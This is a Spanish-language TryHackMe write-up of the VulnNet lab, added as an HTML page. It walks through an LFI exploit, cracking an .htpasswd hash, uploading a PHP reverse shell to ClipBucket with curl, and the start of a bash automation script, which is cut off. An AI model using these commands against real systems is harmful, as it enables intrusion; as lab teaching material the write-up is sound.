@@ -1,0 +1,950 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>VulnNet - Try Hack Me - Invertebrado</title>
+<meta name="description" content="En esta máquina empezamos encontrando entre algunos subdominios ocultos uno donde necesitamos credenciales para acceder, conseguimos las credenciales de acceso gracias a un LFI por medio de un parametro de lde la web mal sanitizado, subimos una shell al servidor consiguiendo RCE como el usuario www-data, luego de esto escalamos privilegios convirtiendonos en el usuario server-management luego de encontrar una id_rsa y finalmente logrando convertirnos en root abusando de un wildcard con tar en una tarea cron">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Invertebrado">
+<meta property="og:title" content="VulnNet - Try Hack Me">
+<meta property="og:url" content="http://localhost:4000/thm-vulnnet/">
+
+
+  <meta property="og:description" content="En esta máquina empezamos encontrando entre algunos subdominios ocultos uno donde necesitamos credenciales para acceder, conseguimos las credenciales de acceso gracias a un LFI por medio de un parametro de lde la web mal sanitizado, subimos una shell al servidor consiguiendo RCE como el usuario www-data, luego de esto escalamos privilegios convirtiendonos en el usuario server-management luego de encontrar una id_rsa y finalmente logrando convertirnos en root abusando de un wildcard con tar en una tarea cron">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/thm-writeup-vulnnet/VulnNet.png">
+
+
+
+
+
+  <meta property="article:published_time" content="2021-08-31T00:00:00-05:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/thm-vulnnet/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "Invertebrado",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Invertebrado Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >About</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">VulnNet - Try Hack Me</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/trocado.png" alt="Invertebrado" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Invertebrado</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Pentester, HackTheBox, <br>TryHackMe, Red Team
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Colombia</span>
+        </li>
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="mailto:invertebr4do@gmail.com">
+            <meta itemprop="email" content="invertebr4do@gmail.com" />
+            <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i> Email
+          </a>
+        </li>
+      
+
+      
+        <li>
+          <a href="https://keybase.io/invertebrado" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fas fa-fw fa-key" aria-hidden="true"></i> Keybase
+          </a>
+        </li>
+      
+
+      
+        <li>
+          <a href="https://twitter.com/Invertebr4do" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i> Twitter
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/Invertebr4do" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="VulnNet - Try Hack Me">
+    <meta itemprop="description" content="En esta máquina empezamos encontrando entre algunos subdominios ocultos uno donde necesitamos credenciales para acceder, conseguimos las credenciales de acceso gracias a un LFI por medio de un parametro de lde la web mal sanitizado, subimos una shell al servidor consiguiendo RCE como el usuario www-data, luego de esto escalamos privilegios convirtiendonos en el usuario server-management luego de encontrar una id_rsa y finalmente logrando convertirnos en root abusando de un wildcard con tar en una tarea cron">
+    <meta itemprop="datePublished" content="August 31, 2021">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">VulnNet - Try Hack Me
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2021-08-31T00:00:00-05:00">August 31, 2021 </time>&emsp;
+          
+          
+        </p>
+        <p align="center">
+<img src="/assets/images/thm-writeup-vulnnet/img_header.png" />
+</p>
+
+<p>Empezamos añadiendo el dominio <strong>vulnnet.thm</strong> al <code class="language-plaintext highlighter-rouge">/etc/hosts</code> como se nos menciona en la página</p>
+
+<p>Una vez hecho esto empezamos con el escaneo de puertos con nmap</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~<span class="nv">$&gt;</span> nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-T5</span> <span class="nt">-v</span> <span class="nt">-n</span> vulnnet.thm
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-08-31 01:08 <span class="nt">-05</span>
+Initiating Ping Scan at 01:08
+Scanning vulnnet.thm <span class="o">(</span>10.10.54.94<span class="o">)</span> <span class="o">[</span>2 ports]
+Completed Ping Scan at 01:08, 0.20s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
+Scanning vulnnet.thm <span class="o">(</span>10.10.54.94<span class="o">)</span> <span class="o">[</span>65535 ports]
+Discovered open port 80/tcp on 10.10.54.94
+Discovered open port 22/tcp on 10.10.54.94
+Nmap scan report <span class="k">for </span>vulnnet.thm <span class="o">(</span>10.10.54.94<span class="o">)</span>
+Not shown: 43285 closed ports, 22248 filtered ports
+Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Read data files from: /usr/bin/../share/nmap
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>114.94 seconds
+</code></pre></div></div>
+<p>Vemos que hay 2 puertos externamente visibles</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">80</code> -&gt; http</li>
+  <li><code class="language-plaintext highlighter-rouge">22</code> -&gt; ssh</li>
+</ul>
+
+<p>Ya que el 80 está abierto, veamoslo desde el navegador</p>
+
+<p align="center">
+<img src="/assets/images/thm-writeup-vulnnet/img1.png" />
+</p>
+
+<p align="center">
+<img src="/assets/images/thm-writeup-vulnnet/img2.png" />
+</p>
+
+<p align="center">
+<img src="/assets/images/thm-writeup-vulnnet/img3.png" />
+</p>
+
+<p>Despues de un rato buscando, no encontré nada interesante así que procedí usando <strong>wfuzz</strong>, para buscar directorios interesantes de la siguiente forma:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~<span class="nv">$&gt;</span> wfuzz <span class="nt">-c</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://vulnnet.thm/FUZZ
+</code></pre></div></div>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">-c</code> -&gt; Formato <strong>colorizado</strong></li>
+  <li><code class="language-plaintext highlighter-rouge">--hc</code> -&gt; <strong>Ocultando</strong> las respuestas con el <strong>código</strong> de estado <strong>404</strong></li>
+  <li><code class="language-plaintext highlighter-rouge">-w</code> -&gt; Wordlist</li>
+  <li><code class="language-plaintext highlighter-rouge">FUZZ</code> -&gt; Lugar donde se aplicara el <strong>fuzzing</strong></li>
+</ul>
+
+<p>Obteniendo esto:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Target: http://vulnnet.thm/FUZZ
+Total requests: 220546
+
+<span class="o">=====================================================================</span>
+ID           Response   Lines    Word       Chars       Payload                                                   
+<span class="o">=====================================================================</span>
+
+000000025:   301        9 L      28 W       308 Ch      <span class="s2">"img"</span>                                                     
+000000536:   301        9 L      28 W       308 Ch      <span class="s2">"css"</span>
+000000939:   301        9 L      28 W       307 Ch      <span class="s2">"js"</span>
+000002757:   301        9 L      28 W       310 Ch      <span class="s2">"fonts"</span>
+</code></pre></div></div>
+<p>En un principio puede parecer que no hay nada de interes, ya que los directorios que encontramos son bastante comunes, pero si vemos el directorio <strong>js</strong> encontramos <strong>3</strong> ficheros de los cuales nos interesa uno que contiene algo que nos puede servir</p>
+
+<p align="center">
+<img src="/assets/images/thm-writeup-vulnnet/img4.png" />
+</p>
+
+<p align="center">
+<img src="/assets/images/thm-writeup-vulnnet/img5.png" />
+</p>
+
+<p>Al abrirlo vemos el código <strong>ofuscado</strong>, podríamos <strong>deobfuscarlo</strong> en algúna página online, para que sea más legible, pero lo que nos interesa lo podemos ver sin necesidad de esto</p>
+
+<p align="center">
+<img src="/assets/images/thm-writeup-vulnnet/img6.png" />
+</p>
+
+<p align="center">
+<img src="/assets/images/thm-writeup-vulnnet/img7.png" />
+</p>
+
+<p>Vemos que dentro de la página principal hay un <strong>parametro</strong> (referer) que no habíamos visto antes, si lo usamos para intentar ver archivos locales de la máquina, nos damos cuenta que hay <strong>LFI</strong></p>
+
+<p align="center">
+<img src="/assets/images/thm-writeup-vulnnet/img8.png" />
+</p>
+
+<p align="center">
+<img src="/assets/images/thm-writeup-vulnnet/img9.png" />
+</p>
+
+<p>No podemos visualizar los logs, por lo que no podremos efectuar un log poisoning, pero encontramos algo muy interesante en el directorio <code class="language-plaintext highlighter-rouge">/etc/apache2/</code>, un fichero <code class="language-plaintext highlighter-rouge">.htpasswd</code> que contiene credenciales que podremos usar más adelante!</p>
+
+<p align="center">
+<img src="/assets/images/thm-writeup-vulnnet/img10.png" />
+</p>
+
+<p align="center">
+<img src="/assets/images/thm-writeup-vulnnet/img11.png" />
+</p>
+
+<p>Rompemos la clave con john usando el rockyou.txt</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~<span class="nv">$&gt;</span> <span class="nb">echo</span> <span class="s2">"developers:</span><span class="nv">$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0</span><span class="s2">"</span> <span class="o">&gt;</span> <span class="nb">hash</span> 
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~<span class="nv">$&gt;</span> john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt <span class="nb">hash</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Warning: detected <span class="nb">hash type</span> <span class="s2">"md5crypt"</span>, but the string is also recognized as <span class="s2">"md5crypt-long"</span>
+Use the <span class="s2">"--format=md5crypt-long"</span> option to force loading these as that <span class="nb">type </span>instead
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>md5crypt, crypt<span class="o">(</span>3<span class="o">)</span> <span class="nv">$1$ </span><span class="o">(</span>and variants<span class="o">)</span> <span class="o">[</span>MD5 256/256 AVX2 8x3]<span class="o">)</span>
+Will run 3 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+9&lt;<span class="k">***</span>CENSORED<span class="k">***</span><span class="o">&gt;</span>s   <span class="o">(</span>developers<span class="o">)</span>
+1g 0:00:00:11 DONE <span class="o">(</span>2021-07-17 21:51<span class="o">)</span> 0.08928g/s 192960p/s 192960c/s 192960C/s 99876543219..99686420
+Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+Session completed
+</code></pre></div></div>
+
+<p>Estas credenciales no nos serán útiles para conectarnos por ssh, así que vamos a buscar subdominios donde podamos usarlas con <strong>gobuster</strong></p>
+
+<p>Yo usaré un wordlist bastante bueno de <a href="https://github.com/danielmiessler/SecLists">este</a> repositorio de github</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~<span class="nv">$&gt;</span> gobuster vhost <span class="nt">-u</span> vulnnet.thm <span class="nt">-w</span> /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">===============================================================</span>
+Gobuster v3.1.0
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:          http://vulnnet.thm
+<span class="o">[</span>+] Method:       GET
+<span class="o">[</span>+] Threads:      10
+<span class="o">[</span>+] Wordlist:     /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
+<span class="o">[</span>+] User Agent:   gobuster/3.1.0
+<span class="o">[</span>+] Timeout:      10s
+<span class="o">===============================================================</span>
+2021/08/31 02:21:17 Starting gobuster <span class="k">in </span>VHOST enumeration mode
+<span class="o">===============================================================</span>
+Found: gc._msdcs.vulnnet.thm <span class="o">(</span>Status: 400<span class="o">)</span> <span class="o">[</span>Size: 424]
+Found: broadcast.vulnnet.thm <span class="o">(</span>Status: 401<span class="o">)</span> <span class="o">[</span>Size: 468]
+</code></pre></div></div>
+<p>Luego de un rato encontramos <strong>2</strong> subdominios, añadimos <strong>broadcast.vulnnet.thm</strong> junto a <strong>vulnnet.thm</strong> en el <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">=================================================</span>
+ /etc/hosts
+<span class="o">==================================================</span>
+&lt;VULNNET_IP&gt;	vulnnet.thm broadcast.vulnnet.thm
+</code></pre></div></div>
+<p>Y entramos desde la web
+Vemos que nos pide credenciales, le proporcionamos las anteriormente encontradas y entramos!</p>
+
+<p align="center">
+<img src="/assets/images/thm-writeup-vulnnet/img12.png" />
+</p>
+
+<p align="center">
+<img src="/assets/images/thm-writeup-vulnnet/img13.png" />
+</p>
+
+<p>Vemos que estamos ante un <strong>clipbucket</strong>, buscando un poco por <strong>exploit-db</strong> encontramos que podemos subir un archivo php con curl, pero antes de esto debemos preparar una shell:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~<span class="nv">$&gt;</span> <span class="nb">cp</span> /usr/share/webshells/php/php-reverse-shell.php <span class="nb">.</span> <span class="o">&amp;&amp;</span> <span class="nb">cat </span>php-reverse-shell.php | <span class="nb">sed</span> <span class="s1">'s/127.0.0.1/&lt;TU_IP&gt;/'</span> | <span class="nb">sed</span> <span class="s1">'s/1234/443/'</span> <span class="o">&gt;</span> shell.php
+</code></pre></div></div>
+<p>Una vez hecho esto podemos ejecutar el siguiente comando para subir nuestra shell:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~<span class="nv">$&gt;</span> curl <span class="nt">-s</span> <span class="nt">-F</span> <span class="s2">"file=@shell.php"</span> <span class="nt">-F</span> <span class="s2">"plupload=1"</span> <span class="nt">-F</span> <span class="s2">"name=shell.php"</span> <span class="s2">"http://broadcast.vulnnet.thm/actions/beats_uploader.php"</span> <span class="nt">-u</span> <span class="s2">"developers:9&lt;***CENSORED***&gt;s"</span>
+</code></pre></div></div>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span><span class="s2">"success"</span>:<span class="s2">"yes"</span>,<span class="s2">"file_name"</span>:<span class="s2">"1630396316db603c"</span>,<span class="s2">"extension"</span>:<span class="s2">"php"</span>,<span class="s2">"file_directory"</span>:<span class="s2">"CB_BEATS_UPLOAD_DIR"</span><span class="o">}</span>
+</code></pre></div></div>
+
+<p>Nos dirigimos a</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/
+</code></pre></div></div>
+<p>que es donde está nuestra shell</p>
+
+<p align="center">
+<img src="/assets/images/thm-writeup-vulnnet/img14.png" />
+</p>
+
+<p align="center">
+<img src="/assets/images/thm-writeup-vulnnet/img15.png" />
+</p>
+
+<p>Nos ponemos en escucha con netcat por el puerto 443</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>~<span class="nv">$&gt;</span> nc <span class="nt">-nlvp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+</code></pre></div></div>
+
+<p>Abrimos nustro fichero subido a la web y obtenemos shell</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>connect to <span class="o">[</span>10.9.242.217] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.55.168] 49674
+Linux vulnnet 4.15.0-134-generic <span class="c">#138-Ubuntu SMP Fri Jan 15 10:52:18 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux</span>
+ 10:00:18 up 25 min,  0 <span class="nb">users</span>,  load average: 0.00, 0.01, 0.16
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
+
+$ whoami
+www-data
+</span></code></pre></div></div>
+<p>Para automatizar todo este proceso decidí crear un pequeño script en bash, que no es muy útil una vez ya llegamos hasta aquí, pero aquí está</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="c">#Colors</span>
+<span class="nv">greenColor</span><span class="o">=</span><span class="s2">"</span><span class="se">\e</span><span class="s2">[0;32m</span><span class="se">\0</span><span class="s2">33[1m"</span>
+<span class="nv">endColor</span><span class="o">=</span><span class="s2">"</span><span class="se">\0</span><span class="s2">33[0m</span><span class="se">\e</span><span class="s2">[0m"</span>
+<span class="nv">redColor</span><span class="o">=</span><span class="s2">"</span><span class="se">\e</span><span class="s2">[0;31m</span><span class="se">\0</span><span class="s2">33[1m"</span>
+<span class="nv">blueColor</span><span class="o">=</span><span class="s2">"</span><span class="se">\e</span><span class="s2">[0;34m</span><span class="se">\0</span><span class="s2">33[1m"</span>
+<span class="nv">yellowColor</span><span class="o">=</span><span class="s2">"</span><span class="se">\e</span><span class="s2">[0;33m</span><span class="se">\0</span><span class="s2">33[1m"</span>
+<span class="nv">turquoiseColor</span><span class="o">=</span><span class="s2">"</span><span class="se">\e</span><span class="s2">[0;36m</span><span class="se">\0</span><span class="s2">33[1m"</span>
+<span class="nv">grayColor</span><span class="o">=</span><span class="s2">"</span><span class="se">\e</span><span class="s2">[0;37m</span><span class="se">\0</span><span class="s2">33[1m"</span>
+
+<span class="k">function </span>ctrl_c<span class="o">(){</span>
+	<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n\n</span><span class="k">${</span><span class="nv">redColor</span><span class="k">}</span><span class="s2">[!] Exiting...</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="se">\n</span><span class="s2">"</span>
+	<span class="nb">exit </span>1
+<span class="o">}</span>
+
+<span class="nb">trap </span>ctrl_c INT
+
+<span class="nb">declare</span> <span class="nt">-r</span> <span class="nv">ip</span><span class="o">=</span><span class="nv">$1</span>
+<span class="nb">declare</span> <span class="nt">-r</span> <span class="nv">port</span><span class="o">=</span><span class="nv">$2</span>
+<span class="nb">declare</span> <span class="nt">-r</span> <span class="nv">developers_credentials</span><span class="o">=</span><span class="s2">"developers:9&lt;***CENSORED***&gt;s"</span> <span class="c"># &lt;- CHANGE THIS</span>
+
+<span class="k">function </span>helpPanel<span class="o">(){</span>
+	<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="k">${</span><span class="nv">yellowColor</span><span class="k">}</span><span class="s2">[</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}${</span><span class="nv">redColor</span><span class="k">}</span><span class="s2">!</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}${</span><span class="nv">yellowColor</span><span class="k">}</span><span class="s2">] Use</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2"> </span><span class="k">${</span><span class="nv">turquoiseColor</span><span class="k">}</span><span class="nv">$0</span><span class="s2"> </span><span class="k">${</span><span class="nv">endColor</span><span class="k">}${</span><span class="nv">redColor</span><span class="k">}</span><span class="s2">&lt;</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}${</span><span class="nv">grayColor</span><span class="k">}</span><span class="s2">YOUR_IP</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}${</span><span class="nv">redColor</span><span class="k">}</span><span class="s2">&gt; &lt;</span><span class="k">${</span><span class="nv">grayColor</span><span class="k">}</span><span class="s2">PORT</span><span class="k">${</span><span class="nv">redColor</span><span class="k">}</span><span class="s2">&gt;</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2">"</span>
+	<span class="nb">exit </span>1
+<span class="o">}</span>
+
+<span class="k">function </span>uploadYgainShell<span class="o">(){</span>
+	tput civis
+	<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="k">${</span><span class="nv">yellowColor</span><span class="k">}</span><span class="s2">[</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}${</span><span class="nv">blueColor</span><span class="k">}</span><span class="s2">*</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}${</span><span class="nv">yellowColor</span><span class="k">}</span><span class="s2">] Uploading the reverse shell..."</span>
+
+	<span class="nb">cp</span> /usr/share/webshells/php/php-reverse-shell.php <span class="nb">.</span> <span class="o">&amp;&amp;</span> <span class="nb">cat </span>php-reverse-shell.php | <span class="nb">sed</span> <span class="s1">'s/127.0.0.1/'</span><span class="nv">$ip</span><span class="s1">'/'</span> | <span class="nb">sed</span> <span class="s1">'s/1234/'</span><span class="nv">$port</span><span class="s1">'/'</span> <span class="o">&gt;</span> shell.php
+	<span class="nv">file_name</span><span class="o">=</span><span class="si">$(</span>curl <span class="nt">-s</span> <span class="nt">-F</span> <span class="s2">"file=@shell.php"</span> <span class="nt">-F</span> <span class="s2">"plupload=1"</span> <span class="nt">-F</span> <span class="s2">"name=shell.php"</span> <span class="s2">"http://broadcast.vulnnet.thm/actions/beats_uploader.php"</span> <span class="nt">-u</span> <span class="s2">"</span><span class="nv">$developers_credentials</span><span class="s2">"</span> | <span class="nb">grep</span> <span class="s2">"file_name"</span> | <span class="nb">awk</span> <span class="s1">'{print $3}'</span> <span class="nv">FS</span><span class="o">=</span><span class="s2">":"</span> | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s2">"</span><span class="se">\"</span><span class="s2">.*?</span><span class="se">\"</span><span class="s2">"</span> | <span class="nb">head</span> <span class="nt">-n</span> 1 | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'"'</span><span class="si">)</span>
+
+	<span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$?</span><span class="si">)</span><span class="s2">"</span> <span class="o">==</span> <span class="s2">"0"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
+		</span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="k">${</span><span class="nv">yellowColor</span><span class="k">}</span><span class="s2">[</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}${</span><span class="nv">greenColor</span><span class="k">}</span><span class="s2">+</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}${</span><span class="nv">yellowColor</span><span class="k">}</span><span class="s2">] Shell uploaded correctly</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2">"</span> <span class="o">&amp;&amp;</span> <span class="nb">sleep </span>0.5
+		<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="k">${</span><span class="nv">yellowColor</span><span class="k">}</span><span class="s2">[</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}${</span><span class="nv">blueColor</span><span class="k">}</span><span class="s2">*</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}${</span><span class="nv">yellowColor</span><span class="k">}</span><span class="s2">] Waiting for connection on port </span><span class="nv">$2</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2">"</span> <span class="o">&amp;&amp;</span> <span class="nb">sleep </span>0.5
+
+		qterminal <span class="nt">-e</span> nc <span class="nt">-nlvp</span> <span class="nv">$port</span> &amp;
+        	<span class="nb">disown</span><span class="p">;</span> <span class="nb">rm </span>php-reverse-shell.php shell.php
+		<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="k">${</span><span class="nv">yellowColor</span><span class="k">}</span><span class="s2">[</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}${</span><span class="nv">greenColor</span><span class="k">}</span><span class="s2">+</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}${</span><span class="nv">yellowColor</span><span class="k">}</span><span class="s2">] Gaining shell as www-data user</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="se">\n</span><span class="s2">"</span> <span class="o">&amp;&amp;</span> curl <span class="nt">-s</span> <span class="s2">"http://broadcast.vulnnet.thm/actions/CB_BEATS_UPLOAD_DIR/"</span><span class="nv">$file_name</span><span class="s2">".php"</span> <span class="nt">--user</span> <span class="s2">"developers:9972761drmfsls"</span> <span class="o">&gt;</span> /dev/null 2&gt;&amp;1 &amp;
+        		<span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="si">$(</span><span class="nb">echo</span> <span class="nv">$?</span><span class="si">)</span><span class="s2">"</span> <span class="o">!=</span> <span class="s2">"0"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
+        			</span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="k">${</span><span class="nv">redColor</span><span class="k">}</span><span class="s2">[x] Connection couldn't be established</span><span class="k">${</span><span class="nv">endColor</span><span class="k">}</span><span class="s2">"</span>
+        			tput cnorm<span class="p">;</span> <span class="nb">exit </span>1
+        		<span class="k">fi
+	else
